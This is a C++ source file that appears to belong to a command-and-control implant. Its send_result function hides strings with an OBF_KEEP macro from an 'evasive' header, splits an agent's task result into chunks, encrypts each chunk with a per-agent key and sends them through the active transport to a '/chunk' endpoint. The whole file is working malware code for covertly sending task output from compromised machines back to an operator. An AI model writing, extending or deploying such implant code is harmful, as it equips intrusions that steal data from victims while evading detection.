#include "Chunked.h"
#include "Protocol.h"
#include "Transport.h"
#include "evasive/Strings.h"
#include "transport/Profile.h"

#include <algorithm>
#include <random>
#include <sstream>

namespace chunked {

namespace {

std::string make_chunk_id() {
    std::ostringstream os;
    std::random_device rd;
    std::uniform_int_distribution<int> d(0, 15);
    for (int i = 0; i < 16; ++i) os << std::hex << d(rd);
    return os.str();
}

} // namespace

bool send_result(std::string_view agent_id, const std::uint8_t key[32],
                 std::string_view task_id, std::string_view result) {
    auto result_pfx = OBF_KEEP("RESULT:");
    std::string payload = result_pfx.c_str();
    payload.append(task_id);
    payload.push_back(':');
    payload.append(result);

    std::size_t total = (payload.size() + k_chunk_size - 1) / k_chunk_size;
    if (total == 0) total = 1;
    if (total > 0xFFFF) total = 0xFFFF; // sanity cap
    std::string chunk_id = make_chunk_id();

    auto path_chunk = OBF_KEEP("/chunk");
    for (std::size_t i = 0; i < total; ++i) {
        std::size_t off = i * k_chunk_size;
        std::size_t len = std::min(k_chunk_size, payload.size() - off);
        std::string chunk = payload.substr(off, len);
        std::string enc = proto::encrypt_for_chunk(agent_id, key, chunk_id, static_cast<int>(i + 1),
                                                   static_cast<int>(total), chunk);
        tx::Reply reply;
        if (!tx::active()->send(path_chunk.c_str(), enc, agent_id, reply)) return false;
    }
    return true;
}

} // namespace chunked
